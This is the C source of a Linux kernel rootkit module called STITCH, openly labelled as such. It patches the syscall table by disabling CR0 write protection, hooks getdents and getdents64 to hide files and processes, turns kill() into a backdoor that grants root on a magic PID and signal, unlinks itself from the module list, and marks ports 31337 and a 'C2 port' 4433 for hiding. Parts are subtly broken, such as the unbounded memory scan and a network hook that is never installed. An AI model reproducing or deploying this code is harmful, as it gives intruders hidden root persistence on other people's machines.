/*
 * STITCH Linux Kernel Rootkit Module
 * Advanced persistence and stealth capabilities
 * 
 * Features:
 * - Process hiding
 * - File/directory hiding
 * - Network connection hiding
 * - Syscall hooking
 * - Privilege escalation
 */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/proc_fs.h>
#include <linux/fdtable.h>
#include <linux/net.h>
#include <linux/seq_file.h>
#include <linux/socket.h>
#include <linux/unistd.h>
#include <linux/kallsyms.h>
#include <linux/tcp.h>
#include <linux/cred.h>
#include <asm/unistd.h>
#include <asm/pgtable.h>
#include <linux/uaccess.h>

// Module info
MODULE_LICENSE("GPL");
MODULE_AUTHOR("STITCH");
MODULE_DESCRIPTION("Advanced Rootkit Module");
MODULE_VERSION("3.0");

// Configuration
#define MAGIC_PREFIX "stitch_"
#define MAGIC_NUMBER 0x31337
#define BACKDOOR_PORT 31337
#define ROOT_UID 0

// Hidden processes, files, and ports
static char *hidden_procs[32];
static int hidden_proc_count = 0;
static char *hidden_files[32];
static int hidden_file_count = 0;
static unsigned short hidden_ports[16];
static int hidden_port_count = 0;

// Original syscall pointers
static unsigned long *sys_call_table;
static unsigned long original_cr0;

// Original syscall functions
static asmlinkage long (*orig_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);
static asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
static asmlinkage long (*orig_kill)(pid_t pid, int sig);
static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);

// Kernel function pointers
static int (*orig_proc_readdir)(struct file *, struct dir_context *);
static int (*orig_proc_filldir)(struct dir_context *, const char *, int, loff_t, u64, unsigned int);

// Helper functions
static struct task_struct *(*find_task)(pid_t pid);
static int (*commit_creds_fn)(struct cred *);
static struct cred *(*prepare_kernel_cred_fn)(struct task_struct *);

// Find sys_call_table address
static unsigned long *find_sys_call_table(void) {
    unsigned long *syscall_table;
    
    // Method 1: kallsyms lookup
    syscall_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    if (syscall_table)
        return syscall_table;
        
    // Method 2: Brute force search in kernel memory
    unsigned long offset;
    unsigned long *ptr;
    
    for (offset = PAGE_OFFSET; offset < ULLONG_MAX; offset += sizeof(void *)) {
        ptr = (unsigned long *)offset;
        
        if (ptr[__NR_close] == (unsigned long)sys_close) {
            printk(KERN_INFO "[STITCH] Found sys_call_table at %p\n", ptr);
            return ptr;
        }
    }
    
    return NULL;
}

// Disable write protection
static void disable_write_protection(void) {
    unsigned long cr0 = read_cr0();
    original_cr0 = cr0;
    cr0 &= ~0x10000; // Clear WP bit
    write_cr0(cr0);
}

// Enable write protection
static void enable_write_protection(void) {
    write_cr0(original_cr0);
}

// Check if process should be hidden
static int should_hide_proc(const char *name) {
    int i;
    
    // Hide by magic prefix
    if (strstr(name, MAGIC_PREFIX))
        return 1;
        
    // Hide specific PIDs
    for (i = 0; i < hidden_proc_count; i++) {
        if (strcmp(name, hidden_procs[i]) == 0)
            return 1;
    }
    
    return 0;
}

// Check if file should be hidden
static int should_hide_file(const char *name) {
    int i;
    
    // Hide by magic prefix
    if (strstr(name, MAGIC_PREFIX))
        return 1;
        
    // Hide specific files
    for (i = 0; i < hidden_file_count; i++) {
        if (strcmp(name, hidden_files[i]) == 0)
            return 1;
    }
    
    return 0;
}

// Check if port should be hidden
static int should_hide_port(unsigned short port) {
    int i;
    
    if (port == BACKDOOR_PORT)
        return 1;
        
    for (i = 0; i < hidden_port_count; i++) {
        if (hidden_ports[i] == port)
            return 1;
    }
    
    return 0;
}

// Hooked getdents64 - hide files and directories
static asmlinkage long stitch_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count) {
    long ret;
    struct linux_dirent64 __user *current_dir, *previous_dir, *dirent_ker;
    unsigned long offset = 0;
    
    ret = orig_getdents64(fd, dirent, count);
    if (ret <= 0)
        return ret;
        
    dirent_ker = kzalloc(ret, GFP_KERNEL);
    if (!dirent_ker)
        return ret;
        
    if (copy_from_user(dirent_ker, dirent, ret)) {
        kfree(dirent_ker);
        return ret;
    }
    
    while (offset < ret) {
        current_dir = (void *)dirent_ker + offset;
        
        if (should_hide_file(current_dir->d_name) || should_hide_proc(current_dir->d_name)) {
            // Hide this entry
            if (current_dir == dirent_ker) {
                // First entry
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
            } else {
                // Middle or end entry
                previous_dir->d_reclen += current_dir->d_reclen;
            }
        } else {
            previous_dir = current_dir;
        }
        
        offset += current_dir->d_reclen;
    }
    
    if (copy_to_user(dirent, dirent_ker, ret)) {
        kfree(dirent_ker);
        return -EFAULT;
    }
    
    kfree(dirent_ker);
    return ret;
}

// Hooked getdents - hide files and directories (32-bit compatibility)
static asmlinkage long stitch_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) {
    long ret;
    struct linux_dirent __user *current_dir, *previous_dir, *dirent_ker;
    unsigned long offset = 0;
    
    ret = orig_getdents(fd, dirent, count);
    if (ret <= 0)
        return ret;
        
    dirent_ker = kzalloc(ret, GFP_KERNEL);
    if (!dirent_ker)
        return ret;
        
    if (copy_from_user(dirent_ker, dirent, ret)) {
        kfree(dirent_ker);
        return ret;
    }
    
    while (offset < ret) {
        current_dir = (void *)dirent_ker + offset;
        
        if (should_hide_file(current_dir->d_name) || should_hide_proc(current_dir->d_name)) {
            if (current_dir == dirent_ker) {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
            } else {
                previous_dir->d_reclen += current_dir->d_reclen;
            }
        } else {
            previous_dir = current_dir;
        }
        
        offset += current_dir->d_reclen;
    }
    
    if (copy_to_user(dirent, dirent_ker, ret)) {
        kfree(dirent_ker);
        return -EFAULT;
    }
    
    kfree(dirent_ker);
    return ret;
}

// Hooked kill - backdoor for privilege escalation
static asmlinkage long stitch_kill(pid_t pid, int sig) {
    // Magic signal for privilege escalation
    if (pid == MAGIC_NUMBER && sig == 64) {
        struct cred *new_creds;
        
        // Find kernel functions if not already found
        if (!commit_creds_fn)
            commit_creds_fn = (void *)kallsyms_lookup_name("commit_creds");
        if (!prepare_kernel_cred_fn)
            prepare_kernel_cred_fn = (void *)kallsyms_lookup_name("prepare_kernel_cred");
            
        if (commit_creds_fn && prepare_kernel_cred_fn) {
            // Elevate to root
            new_creds = prepare_kernel_cred_fn(NULL);
            if (new_creds) {
                commit_creds_fn(new_creds);
                printk(KERN_INFO "[STITCH] Process %d elevated to root\n", current->pid);
                return 0;
            }
        }
    }
    
    // Magic signal to hide process
    if (sig == 63) {
        char pid_str[16];
        snprintf(pid_str, sizeof(pid_str), "%d", pid);
        
        if (hidden_proc_count < 32) {
            hidden_procs[hidden_proc_count] = kstrdup(pid_str, GFP_KERNEL);
            hidden_proc_count++;
            printk(KERN_INFO "[STITCH] Hiding process %d\n", pid);
            return 0;
        }
    }
    
    return orig_kill(pid, sig);
}

// Hide network connections
static int stitch_tcp4_seq_show(struct seq_file *seq, void *v) {
    struct sock *sk = v;
    struct inet_sock *inet;
    unsigned short port;
    
    if (v == SEQ_START_TOKEN)
        return orig_tcp4_seq_show(seq, v);
        
    inet = inet_sk(sk);
    port = ntohs(inet->inet_sport);
    
    if (should_hide_port(port))
        return 0; // Hide this connection
        
    return orig_tcp4_seq_show(seq, v);
}

// Hook syscalls
static int hook_syscalls(void) {
    if (!sys_call_table) {
        printk(KERN_ERR "[STITCH] Cannot find sys_call_table\n");
        return -1;
    }
    
    disable_write_protection();
    
    // Save original syscalls
    orig_getdents64 = (void *)sys_call_table[__NR_getdents64];
    orig_getdents = (void *)sys_call_table[__NR_getdents];
    orig_kill = (void *)sys_call_table[__NR_kill];
    
    // Replace with our hooks
    sys_call_table[__NR_getdents64] = (unsigned long)stitch_getdents64;
    sys_call_table[__NR_getdents] = (unsigned long)stitch_getdents;
    sys_call_table[__NR_kill] = (unsigned long)stitch_kill;
    
    enable_write_protection();
    
    printk(KERN_INFO "[STITCH] Syscalls hooked\n");
    return 0;
}

// Unhook syscalls
static void unhook_syscalls(void) {
    if (!sys_call_table)
        return;
        
    disable_write_protection();
    
    // Restore original syscalls
    sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
    sys_call_table[__NR_getdents] = (unsigned long)orig_getdents;
    sys_call_table[__NR_kill] = (unsigned long)orig_kill;
    
    enable_write_protection();
    
    printk(KERN_INFO "[STITCH] Syscalls restored\n");
}

// Hide the module itself
static void hide_module(void) {
    // Remove from module list
    list_del_init(&__this_module.list);
    
    // Remove kobject
    kobject_del(&__this_module.mkobj.kobj);
    
    printk(KERN_INFO "[STITCH] Module hidden\n");
}

// Module initialization
static int __init stitch_init(void) {
    printk(KERN_INFO "[STITCH] Rootkit loading...\n");
    
    // Find sys_call_table
    sys_call_table = find_sys_call_table();
    if (!sys_call_table) {
        printk(KERN_ERR "[STITCH] Failed to find sys_call_table\n");
        return -1;
    }
    
    // Hook syscalls
    if (hook_syscalls() < 0) {
        printk(KERN_ERR "[STITCH] Failed to hook syscalls\n");
        return -1;
    }
    
    // Hide the module
    hide_module();
    
    // Add some default hidden items
    hidden_procs[0] = kstrdup("stitch", GFP_KERNEL);
    hidden_proc_count = 1;
    
    hidden_files[0] = kstrdup("stitch_rootkit.ko", GFP_KERNEL);
    hidden_file_count = 1;
    
    hidden_ports[0] = 4433; // Our C2 port
    hidden_port_count = 1;
    
    printk(KERN_INFO "[STITCH] Rootkit loaded successfully\n");
    return 0;
}

// Module cleanup
static void __exit stitch_exit(void) {
    int i;
    
    printk(KERN_INFO "[STITCH] Rootkit unloading...\n");
    
    // Unhook syscalls
    unhook_syscalls();
    
    // Free allocated memory
    for (i = 0; i < hidden_proc_count; i++) {
        if (hidden_procs[i])
            kfree(hidden_procs[i]);
    }
    
    for (i = 0; i < hidden_file_count; i++) {
        if (hidden_files[i])
            kfree(hidden_files[i]);
    }
    
    printk(KERN_INFO "[STITCH] Rootkit unloaded\n");
}

module_init(stitch_init);
module_exit(stitch_exit);